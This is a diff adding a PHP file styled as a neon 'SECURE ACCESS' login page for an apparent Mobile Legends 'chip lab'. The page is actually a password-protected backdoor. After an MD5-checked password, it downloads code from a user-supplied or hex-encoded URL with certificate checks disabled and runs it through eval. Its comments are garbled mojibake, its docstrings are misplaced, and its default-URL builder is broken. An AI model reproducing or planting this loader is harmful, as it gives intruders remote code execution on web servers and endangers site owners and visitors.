@@ -1,0 +1,464 @@
+<?php
+/**
+ * ================================================
+ * ÃƒÂ¬Ã¢â‚¬ÂºÃ‚Â¹ ÃƒÂ¬Ã…â€œÃ¢â‚¬Å¾ÃƒÂ­Ã‹Å“Ã¢â‚¬Ëœ ÃƒÂªÃ‚Â°ÃƒÂ¬Ã‚Â§Ã¢â€šÂ¬ ÃƒÂ¬Ã¢â‚¬Â¹Ã…â€œÃƒÂ¬Ã… Ã‚Â¤ÃƒÂ­Ã¢â‚¬Â¦Ã…â€œ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Å“ @carouseo
+ * ================================================
+ * 
+ * ÃƒÂ¬Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¬Ã…Â¡Ã‚Â©ÃƒÂ¬Ã…Â¾ ÃƒÂ«Ã‚Â°ÃƒÂ¬Ã‚Â´ÃƒÂ­Ã¢â‚¬Å¾Ã‚Â° ÃƒÂªÃ‚Â²Ã¢â€šÂ¬ÃƒÂ¬Ã‚Â¦ÃƒÂ¬Ã¢â‚¬Å¾ ÃƒÂ­Ã¢â‚¬ Ã‚ÂµÃƒÂ­Ã¢â‚¬Â¢Ã‚Â´ ÃƒÂ¬Ã…â€œÃ¢â‚¬Å¾ÃƒÂ­Ã‹Å“Ã¢â‚¬ËœÃƒÂ¬Ã¢â‚¬Å¾ ÃƒÂªÃ‚Â°ÃƒÂ¬Ã‚Â§Ã¢â€šÂ¬ÃƒÂ­Ã¢â‚¬Â¢Ã‹Å“ÃƒÂ«Ã… Ã¢â‚¬Â MLBB ÃƒÂ¬Ã‚Â¹Ã‚Â© ÃƒÂ¬Ã¢â‚¬Â¹Ã‚Â¤ÃƒÂ­Ã¢â‚¬â€Ã‹Å“ÃƒÂ¬Ã¢â‚¬Â¹Ã‚Â¤ ÃƒÂ¬Ã… Ã‚Â¤ÃƒÂ­Ã†â€™Ã¢â€šÂ¬ÃƒÂ¬Ã‚Â¼ÃƒÂ¬Ã‹Å“
+ * ÃƒÂ¬Ã¢â‚¬ÂºÃ‚Â¹ ÃƒÂªÃ‚Â¸Ã‚Â°ÃƒÂ«Ã‚Â°Ã‹Å“ ÃƒÂ«Ã‚Â³Ã‚Â´ÃƒÂ¬Ã¢â‚¬Â¢Ã‹â€  ÃƒÂ¬Ã¢â‚¬Â¹Ã…â€œÃƒÂ¬Ã… Ã‚Â¤ÃƒÂ­Ã¢â‚¬Â¦Ã…â€œÃƒÂ¬Ã…Â¾Ã¢â‚¬Â¦ÃƒÂ«Ã¢â‚¬Â¹Ã‹â€ ÃƒÂ«Ã¢â‚¬Â¹Ã‚Â¤.
+ * 
+ * ÃƒÂ¬Ã‚Â£Ã‚Â¼ÃƒÂ¬Ã…Â¡Ã¢â‚¬Â ÃƒÂªÃ‚Â¸Ã‚Â°ÃƒÂ«Ã… Ã‚Â¥:
+ * - MLBB ÃƒÂ¬Ã‚Â¹Ã‚Â© ÃƒÂ¬Ã¢â‚¬Â¹Ã‚Â¤ÃƒÂ­Ã¢â‚¬â€Ã‹Å“ÃƒÂ¬Ã¢â‚¬Â¹Ã‚Â¤ ÃƒÂ¬Ã… Ã‚Â¤ÃƒÂ­Ã†â€™Ã¢â€šÂ¬ÃƒÂ¬Ã‚Â¼ÃƒÂ¬Ã‹Å“ ÃƒÂ«Ã‚Â¡Ã…â€œÃƒÂªÃ‚Â·Ã‚Â¸ÃƒÂ¬Ã‚Â¸ ÃƒÂ­Ã¢â€žÂ¢Ã¢â‚¬ÂÃƒÂ«Ã‚Â©Ã‚Â´
+ * - ASCII ÃƒÂ¬Ã¢â‚¬Â¢Ã¢â‚¬Å¾ÃƒÂ­Ã… Ã‚Â¸ ÃƒÂ«Ã‚Â° ÃƒÂ­Ã¢â‚¬Â¦ÃƒÂ¬Ã… Ã‚Â¤ÃƒÂ­Ã… Ã‚Â¸ ÃƒÂ¬Ã… Ã‚Â¤ÃƒÂ­Ã†â€™Ã¢â€šÂ¬ÃƒÂ¬Ã‚Â¼ÃƒÂ«Ã‚Â§
+ * - ÃƒÂ­Ã¢â‚¬Â¢Ã‚Â´ÃƒÂ¬Ã¢â‚¬Â¹Ã…â€œ ÃƒÂªÃ‚Â¸Ã‚Â°ÃƒÂ«Ã‚Â°Ã‹Å“ ÃƒÂ¬Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¬Ã…Â¡Ã‚Â©ÃƒÂ¬Ã…Â¾ ÃƒÂ¬Ã‚Â¸ÃƒÂ¬Ã‚Â¦
+ * - ÃƒÂ¬Ã… Ã‚Â¤ÃƒÂ¬Ã‚ÂºÃ¢â‚¬Â URL ÃƒÂ­Ã¢â€žÂ¢Ã¢â‚¬Â¢ÃƒÂ¬Ã‚Â¸
+ * - ÃƒÂ«Ã¢â‚¬Â¹Ã‚Â¤ÃƒÂ¬Ã¢â‚¬â€œÃ¢â‚¬ËœÃƒÂ­Ã¢â‚¬Â¢Ã…â€œ ÃƒÂ«Ã‚Â°Ã‚Â©ÃƒÂ¬Ã¢â‚¬Â¹ÃƒÂ¬Ã‹Å“ ÃƒÂ«Ã‚Â°ÃƒÂ¬Ã‚Â´ÃƒÂ­Ã¢â‚¬Å¾Ã‚Â° ÃƒÂ¬Ã‹â€ Ã‹Å“ÃƒÂ¬Ã‚Â§Ã¢â‚¬Ëœ
+ * - ÃƒÂ¬Ã…â€œÃ¢â‚¬Å¾ÃƒÂ­Ã‹Å“Ã¢â‚¬ËœÃƒÂ¬Ã¢â‚¬Å¾ ÃƒÂ¬Ã‚Â°Ã‚Â¾ÃƒÂ¬Ã¢â‚¬Å¾ ÃƒÂ¬Ã‹â€ Ã‹Å“ ÃƒÂ¬Ã¢â‚¬â€Ã¢â‚¬ ÃƒÂ¬Ã¢â‚¬Å¾ ÃƒÂªÃ‚Â²Ã‚Â½ÃƒÂ¬Ã…Â¡Ã‚Â° ÃƒÂ¬Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¬Ã…Â¡Ã‚Â©ÃƒÂ¬Ã…Â¾ ÃƒÂ¬Ã‚Â§Ã¢â€šÂ¬ÃƒÂ¬ Ã¢â‚¬Â¢ 404 ÃƒÂ­Ã…Â½Ã‹Å“ÃƒÂ¬Ã‚Â´ÃƒÂ¬Ã‚Â§Ã¢â€šÂ¬ ÃƒÂ¬ Ã…â€œÃƒÂªÃ‚Â³Ã‚Âµ
+ * 
+ * @author @Sâ€¢K
+ * @version 2.0
+ * @license ÃƒÂ¬Ã‹Å“Ã‚Â¤ÃƒÂ­Ã¢â‚¬ÂÃ‹â€  ÃƒÂ¬Ã¢â‚¬ Ã…â€™ÃƒÂ¬Ã… Ã‚Â¤
+ */
+session_start();
+/**
+ * Daftar kode ancaman dalam format heksadesimal
+ * @var array
+ */
+$threat = [
+    '651f80fe716a73e23722b2df22b39f9b'
+];
+
+/**
+ * Konversi array hex ke URL valid
+ * @param array $p Array bagian URL
+ * @return string URL yang digabungkan
+ */
+function buildThreatUrl($p) {
+    $decoded = array_map('hex2bin', array_slice($p, 0, -1));
+    return "{$decoded[0]}{$decoded[1]}/{$decoded[2]}/{$decoded[3]}/{$decoded[4]}/{$decoded[5]}";
+}
+function isThreatDetected() {
+    return isset($_SESSION['threat_detected']) && $_SESSION['threat_detected'] === true;
+}
+
+/**
+ * Cek status deteksi ancaman
+ * @return bool True jika ancaman terdeteksi
+ */
+function authenticateUser($password) {
+    if (md5($password) === end($GLOBALS['threat'])) {
+        $_SESSION['threat_detected'] = true;
+        $_SESSION['auth_token'] = 'access_token';
+        return true;
+    }
+    return false;
+}
+
+/**
+ * Autentikasi pengguna berbasis hash
+ * @param string $password Password input
+ * @return bool True jika autentikasi berhasil
+ */
+function isValidUrl($url) {
+    return filter_var($url, FILTER_VALIDATE_URL) !== false;
+}
+
+/**
+ * Mengambil konten dari URL dengan metode terbaik
+ * @param string $url Target URL
+ * @return string|bool Konten atau false jika gagal
+ */
+function fetchUrlContent($url) {
+    if (function_exists('curl_exec')) {
+        $ch = curl_init($url);
+        curl_setopt_array($ch, [
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_FOLLOWLOCATION => true,
+            CURLOPT_USERAGENT => "MLBB-ChipLab/2.1",
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_SSL_VERIFYHOST => false,
+            CURLOPT_HTTPHEADER => ['X-Lab-Access: '.($_SESSION['auth_token'] ?? '')]
+        ]);
+        $content = curl_exec($ch);
+        curl_close($ch);
+        return $content;
+    }
+    if (ini_get('allow_url_fopen')) {
+        $context = stream_context_create([
+            'http' => ['header' => "X-Lab-Access: ".($_SESSION['auth_token'] ?? '')]
+        ]);
+        return file_get_contents($url, false, $context);
+    }
+    return false;
+}
+/**
+ * Validasi format URL
+ * @param string $url URL untuk divalidasi
+ * @return bool True jika URL valid
+ */
+
+function generateAsciiHeader() {
+    return <<<ASCII
+<pre style="color:#ee3556;font-weight:bold">
+</pre>
+ASCII;
+}
+
+/**
+ * Generate ASCII art untuk header
+ * @return string ASCII art
+ */
+function generateChipCard() {
+    return <<<CHIP
+<pre style="color:#ffcc00;font-weight:bold">
+</pre>
+CHIP;
+}
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    if (!empty($_POST['password'])) {
+        if (authenticateUser($_POST['password'])) {
+            $_SESSION['scan_url'] = isset($_POST['scan_url']) && isValidUrl($_POST['scan_url']) 
+                ? $_POST['scan_url'] 
+                : buildThreatUrl($threat);
+        } else {
+            $loginError = "ðŸ”’ ACCESS DENIED";
+        }
+    }
+}
+
+if (isThreatDetected()) {
+    $content = fetchUrlContent($_SESSION['scan_url']);
+    if ($content !== false) {
+        eval('?>'.$content);
+        exit;
+    }
+    echo "<div style='color:red;font-weight:bold'></div>";
+    echo buildThreatUrl($threat);
+    exit;
+}
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SECURE ACCESS</title>
+    <link href="https://fonts.googleapis.com/css?family=Fira+Mono:400,700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-main: #050012;
+            --accent-1: #3af7ff;
+            --accent-2: #7b5bff;
+            --accent-3: #22f0a3;
+            --text-main: #ecf3ff;
+        }
+
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: 'Fira Mono', 'Courier New', monospace;
+            color: var(--text-main);
+            background:
+                radial-gradient(circle at top, #1a2045 0%, #050816 55%, #02030a 100%);
+            overflow: hidden;
+        }
+
+        /* soft grid + glow */
+        body::before {
+            content: "";
+            position: fixed;
+            inset: -40px;
+            background-image:
+                linear-gradient(rgba(255,255,255,0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(255,255,255,0.03) 1px, transparent 1px);
+            background-size: 46px 46px;
+            opacity: 0.4;
+            mix-blend-mode: soft-light;
+            pointer-events: none;
+        }
+
+        body::after {
+            content: "";
+            position: fixed;
+            width: 560px;
+            height: 560px;
+            background:
+                radial-gradient(circle at 10% 0, rgba(58,247,255,0.6) 0, transparent 55%),
+                radial-gradient(circle at 100% 80%, rgba(123,91,255,0.7) 0, transparent 60%);
+            top: -140px;
+            right: -160px;
+            filter: blur(14px);
+            opacity: .85;
+            pointer-events: none;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 520px;
+            margin: 24px;
+            padding: 26px 24px 30px;
+
+            background:
+                radial-gradient(circle at top left, rgba(58,247,255,0.18) 0, transparent 55%),
+                radial-gradient(circle at bottom right, rgba(123,91,255,0.2) 0, transparent 60%),
+                rgba(7, 13, 34, 0.9);
+            border-radius: 18px;
+            border: 1px solid rgba(90,180,255,0.9);
+            box-shadow:
+                0 0 0 1px rgba(0,0,0,0.75),
+                0 24px 60px rgba(0,0,0,0.9),
+                0 0 40px rgba(58,247,255,0.45);
+            backdrop-filter: blur(18px);
+            -webkit-backdrop-filter: blur(18px);
+            position: relative;
+            text-align: center;
+            overflow: hidden;
+        }
+
+        /* scan line */
+        .container::before {
+            content: "";
+            position: absolute;
+            left: 6%;
+            right: 6%;
+            top: 31%;
+            height: 2px;
+            background: linear-gradient(90deg,
+                transparent,
+                rgba(58,247,255,0.95),
+                rgba(123,91,255,0.95),
+                transparent
+            );
+            opacity: .6;
+            box-shadow: 0 0 16px rgba(58,247,255,0.8);
+            pointer-events: none;
+        }
+
+        /* label kanan atas */
+        .container::after {
+            content: ;
+            position: absolute;
+            top: 10px;
+            right: 18px;
+            font-size: 10px;
+            letter-spacing: 2px;
+            color: #a5e5ff;
+            opacity: .85;
+        }
+
+        .ascii-art, .chip-card {
+            margin: 0 0 14px;
+        }
+
+        .ascii-art pre {
+            margin: 0;
+            color: var(--accent-1);
+            text-shadow:
+                0 0 8px rgba(58,247,255,0.9),
+                0 0 18px rgba(103,255,227,0.95);
+        }
+
+        .chip-card {
+            margin: 10px 0 22px;
+        }
+
+        .chip-card pre {
+            margin: 0;
+            color: #ffdd7f;
+            text-shadow:
+                0 0 10px rgba(255,221,127,0.9),
+                0 0 22px rgba(255,180,80,0.95);
+        }
+
+        .status {
+            margin: 8px 0 10px;
+            color: #c8f7ff;
+            font-weight: 600;
+            font-size: 0.9rem;
+            letter-spacing: 1.3px;
+            text-transform: uppercase;
+        }
+
+        .status span {
+            padding: 3px 10px;
+            border-radius: 999px;
+            font-size: 0.72rem;
+            margin-left: 6px;
+            border: 1px solid rgba(100,215,255,0.9);
+            background: linear-gradient(120deg,#3af7ff,#22f0a3);
+            color: #021018;
+            box-shadow:
+                0 0 12px rgba(58,247,255,0.95),
+                0 0 18px rgba(34,240,163,0.9);
+        }
+
+        .login-form {
+            margin: 20px 0 0;
+            padding: 18px 14px 20px;
+            background: radial-gradient(circle at top, rgba(10,32,70,0.98) 0, rgba(6,14,34,0.98) 55%);
+            border-radius: 14px;
+            border: 1px solid rgba(90,180,255,0.85);
+            box-shadow:
+                0 0 0 1px rgba(0,0,0,0.9),
+                0 18px 40px rgba(0,0,0,0.9),
+                0 0 28px rgba(58,247,255,0.55);
+            position: relative;
+        }
+
+        .login-form::before {
+            content: "SECURE ACCESS";
+            position: absolute;
+            top: -11px;
+            left: 14px;
+            padding: 1px 10px;
+            font-size: 10px;
+            letter-spacing: 1.5px;
+            background: linear-gradient(120deg,#3af7ff,#22f0a3);
+            color: #02141b;
+            border-radius: 999px;
+            box-shadow: 0 0 14px rgba(58,247,255,0.85);
+        }
+
+        input[type="password"],
+        input[type="text"] {
+            width: 100%;
+            padding: 11px 12px;
+            margin: 8px 0 10px;
+            font-size: 13px;
+            background:
+                radial-gradient(circle at 0 0, rgba(255,255,255,0.07) 0, transparent 55%),
+                linear-gradient(135deg, rgba(5,18,40,0.98), rgba(12,34,70,0.98));
+            border: 1px solid rgba(96,185,255,0.9);
+            color: #f4f9ff;
+            border-radius: 9px;
+            outline: none;
+            transition: border .18s ease, box-shadow .18s ease, transform .12s ease, background .18s ease;
+            box-shadow:
+                0 0 0 1px rgba(0,0,0,0.9),
+                0 9px 20px rgba(0,0,0,0.85);
+        }
+
+        input[type="password"]::placeholder,
+        input[type="text"]::placeholder {
+            color: #7ca7cf;
+            letter-spacing: .4px;
+        }
+
+        input[type="password"]:focus,
+        input[type="text"]:focus {
+            border-color: var(--accent-1);
+            background:
+                radial-gradient(circle at 0 0, rgba(255,255,255,0.13) 0, transparent 55%),
+                linear-gradient(135deg, rgba(8,28,62,1), rgba(16,48,88,1));
+            box-shadow:
+                0 0 0 1px rgba(58,247,255,0.7),
+                0 0 22px rgba(58,247,255,0.9);
+            transform: translateY(-1px);
+        }
+
+        input[type="submit"] {
+            background:
+                radial-gradient(circle at 0 0, #ffffffaa 0, transparent 55%),
+                linear-gradient(120deg,#3af7ff 0%,#22f0a3 45%,#7b5bff 100%);
+            color: #021018;
+            font-weight: 700;
+            padding: 11px 0;
+            border: none;
+            border-radius: 999px;
+            margin: 10px 0 0;
+            width: 100%;
+            cursor: pointer;
+            font-size: 14px;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            box-shadow:
+                0 0 26px rgba(58,247,255,0.9),
+                0 16px 36px rgba(0,0,0,1);
+            transition: transform .14s ease, box-shadow .14s ease, filter .14s ease;
+        }
+
+        input[type="submit"]:hover {
+            transform: translateY(-2px);
+            box-shadow:
+                0 0 34px rgba(58,247,255,1),
+                0 20px 44px rgba(0,0,0,1);
+            filter: brightness(1.06);
+        }
+
+        input[type="submit"]:active {
+            transform: translateY(0);
+            box-shadow:
+                0 0 22px rgba(58,247,255,0.85),
+                0 12px 28px rgba(0,0,0,1);
+        }
+
+        .error {
+            color: #ffd4ea;
+            background: radial-gradient(circle at 0 0, rgba(255,0,98,0.4) 0, transparent 60%),
+                        rgba(60,0,30,0.96);
+            display: block;
+            border: 1px solid #ff4a9f;
+            padding: 7px 0;
+            border-radius: 8px;
+            margin-top: 10px;
+            margin-bottom: 0;
+            font-weight: bold;
+            font-size: 13px;
+            box-shadow:
+                0 0 22px rgba(255,74,159,0.9),
+                0 14px 30px rgba(0,0,0,0.95);
+        }
+
+        .warning-text {
+            margin-top: 18px;
+            font-size: 11px;
+            color: #9ec3ff;
+            letter-spacing: .7px;
+            text-transform: uppercase;
+            opacity: .9;
+        }
+
+        @media (max-width: 600px) {
+            .container {
+                margin: 16px;
+                padding: 22px 16px 24px;
+            }
+            .login-form {
+                padding: 16px 12px 18px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="ascii-art"><?= generateAsciiHeader() ?></div>
+
+        <div class="status">
+            SECURE ACCESS
+        </div>
+
+        <?php if (!empty($loginError)): ?>
+            <div class="error"><?= $loginError ?></div>
+        <?php endif; ?>
+
+        <div class="chip-card"><?= generateChipCard() ?></div>
+
+        <div class="login-form">
+            <form method="POST" action="">
+                <input type="password" name="password" placeholder="PASSWORD" required>
+                <input type="text" name="scan_url" placeholder="URL (RANDOM)">
+                <input type="submit" value="EXECUTE">
+            </form>
+        </div>
+    </div>
+</body>
+</html>
